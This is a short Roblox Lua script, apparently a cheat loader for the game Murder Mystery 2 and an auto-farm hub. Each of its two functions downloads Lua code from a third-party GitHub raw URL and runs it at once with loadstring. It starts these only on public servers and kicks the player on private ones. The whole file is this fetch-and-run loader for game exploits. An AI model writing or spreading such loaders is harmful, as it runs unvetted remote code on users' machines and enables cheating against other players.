local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function mm2()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/hayrankal/api.overdrivehub.xyz/refs/heads/main/%7C'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
end

-- Sunucu kontrol√º
local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()

if not isVIPServer then
    task.spawn(mm2)
    task.spawn(farm)
else
    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
end
